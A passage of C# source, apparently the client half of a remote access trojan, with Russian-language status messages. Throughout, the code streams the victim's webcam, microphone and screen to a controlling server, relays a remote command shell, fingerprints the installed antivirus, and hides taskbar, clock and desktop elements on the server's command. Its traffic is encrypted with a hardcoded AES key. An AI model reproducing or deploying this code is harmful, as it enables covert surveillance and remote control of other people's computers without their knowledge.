                RDesktop.isShutdown = true;
                Console.WriteLine("Соединение прервано.");
            }
        }

        /// <summary>
        /// Handle camera imagage frames
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">Frame Event Arguments</param>
        private static void Source_NewFrame(object sender, NewFrameEventArgs e)
        {
            try
            {
                Bitmap cam = (Bitmap)e.Frame.Clone(); //Get the frame of the camera

                ImageConverter convert = new ImageConverter(); //Create a new image converter
                byte[] camBuffer = (byte[])convert.ConvertTo(cam, typeof(byte[])); //Convert the image to bytes
                byte[] send = new byte[camBuffer.Length + 16]; //Create a new buffer for the command
                byte[] header = GetEncoder().GetBytes("wcstream"); //Get the bytes of the header
                Buffer.BlockCopy(header, 0, send, 0, header.Length); //Copy the header to the main buffer
                Buffer.BlockCopy(camBuffer, 0, send, header.Length, camBuffer.Length); //Copy the image to the main buffer
                _clientSocket.Send(send, 0, send.Length, SocketFlags.None); //Send the frame to the server
                //Wait for send and dispose the image
                Application.DoEvents();
                Thread.Sleep(200);
                cam.Dispose();
            }
            catch (Exception) //Something went wrong
            {
                try
                {
                    Console.WriteLine("Соединение прервано.");
                    Thread.Sleep(3000);
                    isDisconnect = true; //Disconnect from the server
                }
                catch (Exception exc) //Something went really wrong
                {
                    //Restart the whole application
                    Console.WriteLine("Критическая ошибка 1: " + exc.Message);
                    Thread.Sleep(10000);
                    Application.Restart();
#pragma warning disable S3626 // Jump statements should not be redundant
                    return;
#pragma warning restore S3626 // Jump statements should not be redundant
                }
            }
        }

        /// <summary>
        /// Handle audio data from microphone
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The Audio event arguments</param>
        private static void SendAudio(object sender, NAudio.Wave.WaveInEventArgs e)
        {
            byte[] rawAudio = e.Buffer; //Get the buffer of the audio
            byte[] send = new byte[rawAudio.Length + 16]; //Create a new buffer to send to the server
            byte[] header = Encoding.Unicode.GetBytes("austream"); //Get the bytes of the header
            Buffer.BlockCopy(header, 0, send, 0, header.Length); //Copy the header to the main buffer
            Buffer.BlockCopy(rawAudio, 0, send, header.Length, rawAudio.Length); //Copy the audio data to the main buffer
            _clientSocket.Send(send, 0, send.Length, SocketFlags.None); //Send audio data to the server
        }

        /// <summary>
        /// Send desktop screen to the server
        /// </summary>
        /// <param name="img">The image to send as bytes</param>
        public static void SendScreen(byte[] img)
        {
            try
            {
                byte[] send = new byte[img.Length + 16]; //Create a new buffer to send to the server
                byte[] header = Encoding.Unicode.GetBytes("rdstream"); //Get the bytes of the header
                Buffer.BlockCopy(header, 0, send, 0, header.Length); //Copy the header to the main buffer
                Buffer.BlockCopy(img, 0, send, header.Length, img.Length); //Copy the image to the main buffer
                _clientSocket.Send(send, 0, send.Length, SocketFlags.None); //Send the image to the server
            }
            catch (Exception) //Something went wrong
            {
                try
                {
                    Console.WriteLine("Соединение прервано.");
                    Thread.Sleep(3000);
                    isDisconnect = true; //Disconnect from server
                }
                catch (Exception exc) //Something went really wrong
                {
                    //Restart the application
                    Console.WriteLine("Критическая ошибка 2: " + exc.Message);
                    Thread.Sleep(10000);
                    Application.Restart();
                }
            }
        }

        /// <summary>
        /// Handle a mouse click event from the server
        /// </summary>
        /// <param name="button">The button to manipulate</param>
        /// <param name="direction">Press down or release action</param>
        private static void MouseEvent(string button, string direction)
        {
            //Get the current position of the mouse
            int X = Cursor.Position.X;
            int Y = Cursor.Position.Y;

            //Check and handle button press or release
            switch (button)
            {
                case "left":
                    if (direction == "up")
                    {
                        Mouse_eventLeftUP(X, Y, 0, 0);
                    }
                    else
                    {
                        Mouse_eventLeftDown(X, Y, 0, 0);
                    }

                    break;

                case "right":
                    if (direction == "up")
                    {
                        Mouse_eventRightUP(X, Y, 0, 0);
                    }
                    else
                    {
                        Mouse_eventRightDown(X, Y, 0, 0);
                    }

                    break;
            }
        }

        /// <summary>
        /// Release the left
        /// </summary>
        /// <param name="lEFTUP">Mouse event code</param>
        /// <param name="x">The mouse X position on the screen</param>
        /// <param name="y">The mouse Y position on the screen</param>
        /// <param name="v1"></param>
        /// <param name="v2"></param>
        private static void Mouse_eventLeftUP(int x, int y, int v1, int v2)
        {
            Cursor.Position = new Point(x, y);
            mouse_event((int)(MouseEventFlags.LEFTUP), x, y, v1, v2);
        }

        /// <summary>
        /// Press down the left mouse button
        /// </summary>
        /// <param name="lEFTUP">Mouse event code</param>
        /// <param name="x">The mouse X position on the screen</param>
        /// <param name="y">The mouse Y position on the screen</param>
        /// <param name="v1"></param>
        /// <param name="v2"></param>
        private static void Mouse_eventLeftDown(int x, int y, int v1, int v2)
        {
            Cursor.Position = new Point(x, y);
            mouse_event((int)(MouseEventFlags.LEFTDOWN), x, y, v1, v2);
        }

        /// <summary>
        /// Release the right mouse button
        /// </summary>
        /// <param name="lEFTUP">Mouse event code</param>
        /// <param name="x">The mouse X position on the screen</param>
        /// <param name="y">The mouse Y position on the screen</param>
        /// <param name="v1"></param>
        /// <param name="v2"></param>
        private static void Mouse_eventRightUP(int x, int y, int v1, int v2)
        {
            Cursor.Position = new Point(x, y);
            mouse_event((int)(MouseEventFlags.RIGHTUP), x, y, v1, v2);
        }

        /// <summary>
        /// Press down the right mouse button
        /// </summary>
        /// <param name="lEFTUP">Mouse event code</param>
        /// <param name="x">The mouse X position on the screen</param>
        /// <param name="y">The mouse Y position on the screen</param>
        /// <param name="v1"></param>
        /// <param name="v2"></param>
        private static void Mouse_eventRightDown(int x, int y, int v1, int v2)
        {
            Cursor.Position = new Point(x, y);
            mouse_event((int)(MouseEventFlags.RIGHTDOWN), x, y, v1, v2);
        }

        /// <summary>
        /// Copy a directory
        /// </summary>
        /// <param name="sourceDirName">The directory to copy</param>
        /// <param name="destDirName">The directory to copy to</param>
        /// <param name="copySubDirs">True if recursive, otherwise false</param>
        private static void DirectoryCopy(string sourceDirName, string destDirName, bool copySubDirs)
        {
            // Get the subdirectories for the specified directory.
            DirectoryInfo dir = new DirectoryInfo(sourceDirName);
            DirectoryInfo[] dirs = dir.GetDirectories();

            if (!dir.Exists)
            {
                throw new DirectoryNotFoundException(
                    "Исходный каталог не существует или не может быть найден: " +
                    sourceDirName);
            }

            // If the destination directory doesn't exist, create it. 
            if (!Directory.Exists(destDirName))
            {
                Directory.CreateDirectory(destDirName);
            }

            // Get the files in the directory and copy them to the new location.
            FileInfo[] files = dir.GetFiles();
            foreach (FileInfo file in files)
            {
                string temppath = Path.Combine(destDirName, file.Name);
                file.CopyTo(temppath, false);
            }

            // If copying subdirectories, copy them and their contents to new location. 
            if (copySubDirs)
            {
                foreach (DirectoryInfo subdir in dirs)
                {
                    string temppath = Path.Combine(destDirName, subdir.Name);
                    DirectoryCopy(subdir.FullName, temppath, copySubDirs);
                }
            }
        }

        /// <summary>
        /// Move directory
        /// </summary>
        /// <param name="sourceDirName">The directory to copy</param>
        /// <param name="destDirName">The directory to copy to</param>
        /// <param name="copySubDirs">True if recursive, otherwise false</param>
        private static void DirectoryMove(string sourceDirName, string destDirName, bool copySubDirs)
        {
            // Get the subdirectories for the specified directory.
            DirectoryInfo dir = new DirectoryInfo(sourceDirName);
            DirectoryInfo[] dirs = dir.GetDirectories();

            if (!dir.Exists)
            {
                throw new DirectoryNotFoundException(
                    "Исходный каталог не существует или не может быть найден: " +
                    sourceDirName);
            }

            // If the destination directory doesn't exist, create it. 
            if (!Directory.Exists(destDirName))
            {
                Directory.CreateDirectory(destDirName);
            }

            // Get the files in the directory and copy them to the new location.
            FileInfo[] files = dir.GetFiles();
            foreach (FileInfo file in files)
            {
                string temppath = Path.Combine(destDirName, file.Name);
                file.MoveTo(temppath);
            }

            // If copying subdirectories, copy them and their contents to new location. 
            if (copySubDirs)
            {
                foreach (DirectoryInfo subdir in dirs)
                {
                    string temppath = Path.Combine(destDirName, subdir.Name);
                    DirectoryMove(subdir.FullName, temppath, copySubDirs);
                }
            }
        }

        /// <summary>
        /// Read output from the remote cmd module
        /// </summary>
        private static void GetShellOutput()
        {
            Task.Factory.StartNew(() => {
                try
                {
                    string outputBuffer = "";

                    while ((outputBuffer = fromShell.ReadLine()) != null)
                    {
                        SendCommand("cmdout§" + outputBuffer);
                    }
                }
                catch (Exception ex)
                {
                    SendCommand("cmdout§Ошибка при чтении ответа cmd: \n" + ex.Message); //Send message to remote cmd window
                    ReportError(ErrorType.CMD_STREAM_READ, "Не удается прочитать поток!", "Удаленное чтение потока Cmd не удалось!"); //Report error to the server
                }
            });

            Task.Factory.StartNew(() => {
                try
                {
                    string errorBuffer = "";

                    while ((errorBuffer = error.ReadLine()) != null)
                    {
                        SendCommand("cmdout§" + errorBuffer);
                    }
                }
                catch (Exception ex)
                {
                    SendCommand("cmdout§Ошибка при чтении ответа cmd: \n" + ex.Message); //Send message to remote cmd window
                    ReportError(ErrorType.CMD_STREAM_READ, "Не удается прочитать поток!", "Удаленное чтение потока Cmd не удалось!"); //Report error to the server
                }
            });

        }

        /// <summary>
        /// Hide the clock
        /// </summary>
        public static void HClock()
        {
            int hwnd = 0;
            ShowWindow(
                FindWindowEx(FindWindowEx(FindWindow("Shell_TrayWnd", null), hwnd, "TrayNotifyWnd", null),
                    hwnd, "TrayClockWClass", null),
                SW_HIDE);
        }

        /// <summary>
        /// Show the clock
        /// </summary>
        public static void SClock()
        {
            int hwnd = 0;
            ShowWindow(
                FindWindowEx(FindWindowEx(FindWindow("Shell_TrayWnd", null), hwnd, "TrayNotifyWnd", null),
                    hwnd, "TrayClockWClass", null),
                SW_SHOW);
        }

        /// <summary>
        /// Hide the task bar
        /// </summary>
        public static void HTaskBar()
        {
            ShowWindow(FindWindow("Shell_TrayWnd", null), SW_HIDE);
        }

        /// <summary>
        /// Show the task bar
        /// </summary>
        public static void STaskBar()
        {
            ShowWindow(FindWindow("Shell_TrayWnd", null), SW_SHOW);
        }

        /// <summary>
        /// Hide desktop icons
        /// </summary>
        public static void HDesktop()
        {
            ShowWindow(FindWindow(null, "Program Manager"), SW_HIDE);
        }

        /// <summary>
        /// Show desktop icons
        /// </summary>
        public static void SDesktop()
        {
            ShowWindow(FindWindow(null, "Program Manager"), SW_SHOW);
        }

        /// <summary>
        /// Hide tray icons
        /// </summary>
        public static void HTrayIcons()
        {
            int hwnd = 0;
            ShowWindow(FindWindowEx(FindWindow("Shell_TrayWnd", null),
                    hwnd, "TrayNotifyWnd", null),
                SW_HIDE);
        }

        /// <summary>
        /// Show tray icons
        /// </summary>
        public static void STrayIcons()
        {
            int hwnd = 0;
            ShowWindow(FindWindowEx(FindWindow("Shell_TrayWnd", null),
                    hwnd, "TrayNotifyWnd", null),
                SW_SHOW);
        }

        /// <summary>
        /// Hide start button (Only on XP)
        /// </summary>
        public static void HStart()
        {
            ShowWindow(FindWindow("Button", null), SW_HIDE);
        }

        /// <summary>
        /// Show start button
        /// </summary>
        public static void SStart()
        {
            ShowWindow(FindWindow("Button", null), SW_SHOW);
        }

        /// <summary>
        /// Text to speech
        /// </summary>
        /// <param name="stext">The text to read out</param>
        private static void T2S(string stext)
        {
            using (System.Speech.Synthesis.SpeechSynthesizer speech = new System.Speech.Synthesis.SpeechSynthesizer()) //Create a new text reader
            {
                speech.SetOutputToDefaultAudioDevice(); //Set the output device
                speech.Speak(stext); //Read the text
            }
        }

        /// <summary>
        /// Play a frequency
        /// </summary>
        /// <param name="freq">The frequncy to play</param>
        /// <param name="duration">The duration of the frequency to play</param>
        private static void GenerateFreq(int freq, int duration)
        {
            Console.Beep(freq, duration * 1000); //Play the frequency
        }

        /// <summary>
        /// Create and display a message box
        /// </summary>
        /// <param name="info">The string info sent by the server</param>
        private static void CreateMessage(String[] info)
        {
            string title = info[1]; //Get the title
            string text = info[2]; //Get the prompt text
            string icon = info[3]; //Get the icon
            string button = info[4]; //Get the buttons
            MessageBoxIcon ico;
            MessageBoxButtons btn;

            //Parse the icon and buttons data

            switch (icon)
            {
                case "1":
                    ico = MessageBoxIcon.Error;
                    break;

                case "2":
                    ico = MessageBoxIcon.Warning;
                    break;

                case "3":
                    ico = MessageBoxIcon.Information;
                    break;

                case "4":
                    ico = MessageBoxIcon.Question;
                    break;

                default:
                    ico = MessageBoxIcon.None;
                    break;
            }

            switch (button)
            {
                case "1":
                    btn = MessageBoxButtons.YesNo;
                    break;

                case "2":
                    btn = MessageBoxButtons.YesNoCancel;
                    break;

                case "3":
                    btn = MessageBoxButtons.AbortRetryIgnore;
                    break;

                case "4":
                    btn = MessageBoxButtons.OKCancel;
                    break;
                default:
                    btn = MessageBoxButtons.OK;
                    break;
            }
            MessageBox.Show(text, title, btn, ico); //Display the message box
        }

        /// <summary>
        /// Get the IPv4 address of the local machine
        /// </summary>
        /// <returns>The IPv4 address of the machine</returns>
        public static string GetLocalIPAddress()
        {
            if (GetLocalIPCache() != string.Empty) return GetLocalIPCache();
            IPHostEntry host = Dns.GetHostEntry(Dns.GetHostName()); //Get our ip addresses
            for (int i = 0; i < host.AddressList.Length; i++) //Go through the addresses
            {
                if (host.AddressList[i].AddressFamily == AddressFamily.InterNetwork) //If address is inet
                {
                    SetLocalIPCache(host.AddressList[i].ToString());
                    return host.AddressList[i].ToString(); //Return the ip of the machine
                }
            }
            return "N/A"; //IP not found at this point
        }

        /// <summary>
        /// Get the Anti-Virus product name of the machine
        /// </summary>
        /// <returns>The name of the installed AV product</returns>
        public static string AvName()
        {
            if (GetLocalAVCache() != string.Empty) return GetLocalAVCache();
            string wmipathstr = @"\\" + Environment.MachineName + @"\root\SecurityCenter2"; //Create the WMI path
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(wmipathstr, "SELECT * FROM AntivirusProduct"); //Create a search query
            ManagementObjectCollection instances = searcher.Get(); //Search the database
            string av = ""; //The name of the AV product
            foreach (ManagementBaseObject instance in instances) //Go through the results
            {
                av = instance.GetPropertyValue("displayName").ToString(); //Get the name of the AV
            }

            if (av == "") av = "N/A"; //If AV name isn't found return this

            SetLocalAVCache(av);

            return av; //Return the name of the installed AV Product
        }

        /// <summary>
        /// Encrypt data
        /// </summary>
        /// <param name="clearText">The message to encrypt</param>
        /// <returns>The encrypted Base64 CipherText</returns>
        public static string Encrypt(string clearText)
        {
            try
            {
                string EncryptionKey = "MAKV2SPBNI99212"; //Encryption key
                byte[] clearBytes = Encoding.Unicode.GetBytes(clearText); //Bytes of the message
                using (Aes encryptor = Aes.Create()) //Create a new AES decryptor
                {
                    //Encrypt the data
                    Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] {
                        0x49,
                        0x76,
                        0x61,
                        0x6e,
                        0x20,
                        0x4d,
                        0x65,
                        0x64,
                        0x76,
                        0x65,
                        0x64,
                        0x65,
                        0x76
                    });
                    encryptor.Key = pdb.GetBytes(32);
                    encryptor.IV = pdb.GetBytes(16);

                    using (MemoryStream ms = new MemoryStream())
                    {
                        using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(clearBytes, 0, clearBytes.Length);
                            cs.Close();
                        }
                        clearText = Convert.ToBase64String(ms.ToArray());
                    }
                }
                return clearText; //Return the encrypted text
            }
            catch (Exception) //Something went wrong
            {
                ReportError(ErrorType.ENCRYPT_DATA_CORRUPTED, "Не удается зашифровать сообщение!", "Ошибка шифрования сообщения!"); //Report error to server
                return clearText; //Send the plain text data
            }
        }

        /// <summary>
        /// Decrypt encrypted data
        /// </summary>
        /// <param name="cipherText">The data to decrypt</param>
        /// <returns>The plain text message</returns>
        public static string Decrypt(string cipherText)
        {
            try
            {
                string EncryptionKey = "MAKV2SPBNI99212"; //this is the secret encryption key  you want to hide dont show it to other guys
                byte[] cipherBytes = Convert.FromBase64String(cipherText); //Get the encrypted message's bytes
                using (Aes encryptor = Aes.Create()) //Create a new AES object
                {
                    //Decrypt the text
                    Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] {
                        0x49,
                        0x76,
                        0x61,
                        0x6e,
                        0x20,
                        0x4d,
                        0x65,
                        0x64,
                        0x76,
                        0x65,
                        0x64,
                        0x65,
                        0x76
                    });
                    encryptor.Key = pdb.GetBytes(32);
                    encryptor.IV = pdb.GetBytes(16);
                    using (MemoryStream ms = new MemoryStream())
                    {
                        using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(cipherBytes, 0, cipherBytes.Length);
                            cs.Close();
                        }
                        cipherText = Encoding.Unicode.GetString(ms.ToArray());
                    }
                }
                return cipherText; //Return the plain text data
            }
            catch (Exception ex) //Something went wrong
            {
                Console.WriteLine(ex.Message);
                Console.WriteLine("Зашифрованный текст: " + cipherText);
                ReportError(ErrorType.DECRYPT_DATA_CORRUPTED, "Не удается расшифровать сообщение!", "Не удалось расшифровать сообщение!"); //Report error to the server
                return "error"; //Return error
            }
        }

        /// <summary>
        /// Send data to the server
        /// </summary>
        /// <param name="response">The data to send</param>
        /// <param name="isCmd">If remote cmd is sending the data</param>
        private static void SendCommand(string response)
        {
            if (!_clientSocket.Connected) //If the client isn't connected
            {
                Console.WriteLine("Сокет не подключен!");
                return; //Return
            }
            response = Encrypt(response);
            byte[] data = GetEncoder().GetBytes(response); //Get the bytes of the encrypted data

            try
            {
                _clientSocket.Send(data); //Send the data to the server
            }
            catch (Exception ex) //Failed to send data to the server
            {
                Console.WriteLine("Ошибка отправки команды " + ex.Message);
            }
        }
    }
}